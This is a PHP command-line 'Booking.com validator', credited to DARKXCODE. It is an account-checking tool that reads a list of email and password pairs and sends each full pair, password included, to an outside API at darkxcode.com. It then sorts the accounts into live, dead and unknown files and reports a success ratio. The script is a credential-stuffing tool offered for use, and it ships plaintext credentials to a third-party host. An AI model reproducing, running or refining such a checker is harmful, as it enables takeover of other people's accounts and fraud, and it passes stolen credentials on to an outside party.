<?php

// DONT CHANGE THIS
/*==========> INFO 
 * CODE     : BY ZLAXTERT
 * SCRIPT   : BOOKING.COM VALIDATOR
 * VERSION  : 1.0
 * TELEGRAM : t.me/zlaxtert
 * BY       : DARKXCODE
 */
require_once "function/function.php";

echo banner();
echo banner2();
enterlist:
echo "\n\n[+] Enter your list (eg: list.txt) >> ";
$listname = trim(fgets(STDIN));
if(empty($listname) || !file_exists($listname)) {
 echo " [!] Your Fucking list not found [!]".PHP_EOL;
 goto enterlist;
}
$lists = array_unique(explode("\n",str_replace("\r","",file_get_contents($listname))));

$total = count($lists);
$live = 0;
$die = 0;
$unknown = 0;
$no = 0;
echo PHP_EOL.PHP_EOL;
foreach ($lists as $list) {
    $no++;
    // EXPLODE
    if(strpos($list, "|") !== false) list($email, $pass) = explode("|", $list);
    else if(strpos($list, ":") !== false) list($email, $pass) = explode(":", $list);
    else $email = $list;
    if(empty($email)) continue;
    $api = "https://darkxcode.com/validator/bocom/?list=$list&proxy=$Proxies&proxyPWD=$proxy_pass";
    // CURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $api);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, 1);
    $x = curl_exec($ch);
    curl_close($ch);
    $js  = json_decode($x, TRUE);
    $msg = $js['data']['info']['msg'];

    if(strpos($x, '"status":"success"')){
        $live++;
        save_file("result/live.txt","$email");
        echo "[$RD$no$DEF/$GR$total$DEF]$GR LIVE$DEF =>$BL $email$DEF | [$YL VALID$DEF:$WH true$DEF ] [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF V.1.0".PHP_EOL;
    }else if (strpos($x, '"status":"failed"')){
        $die++;
        save_file("result/die.txt","$email");
        echo "[$RD$no$DEF/$GR$total$DEF]$RD DIE$DEF =>$BL $email$DEF | [$YL VALID$DEF:$WH false$DEF ] [$YL MSG$DEF: $MG$msg$DEF ] | BY$CY DARKXCODE$DEF V.1.0".PHP_EOL;
    }else{
        $unknown++;
        save_file("result/unknown.txt","$email");
        echo "[$RD$no$DEF/$GR$total$DEF]$YL UNKNOWN$DEF =>$BL $email$DEF | BY$CY DARKXCODE$DEF V.1.0".PHP_EOL;
    }

}
//============> END

echo PHP_EOL;
echo "================[DONE]================".PHP_EOL;
echo " DATE          : ".$date.PHP_EOL;
echo " LIVE          : ".$live.PHP_EOL;
echo " DIE           : ".$die.PHP_EOL;
echo " UNKNOWN       : ".$unknown.PHP_EOL;
echo " TOTAL         : ".$total.PHP_EOL;
echo "======================================".PHP_EOL;
echo "[+] RATIO VALID => $GR".round(RatioCheck($live, $total))."%$DEF".PHP_EOL.PHP_EOL;
echo "[!] NOTE : CHECK AGAIN FILE 'unknown.txt' [!]".PHP_EOL;
echo "This file '".$listname."'".PHP_EOL;
echo "File saved in folder 'result/' ".PHP_EOL.PHP_EOL;


// ==========> FUNCTION

function collorLine($col){
    $data = array(
        "GR" => "\e[32;1m",
        "RD" => "\e[31;1m",
        "BL" => "\e[34;1m",
        "YL" => "\e[33;1m",
        "CY" => "\e[36;1m",
        "MG" => "\e[35;1m",
        "WH" => "\e[37;1m",
        "DEF" => "\e[0m"
    );
    $collor = $data[$col];
    return $collor;
}
?>
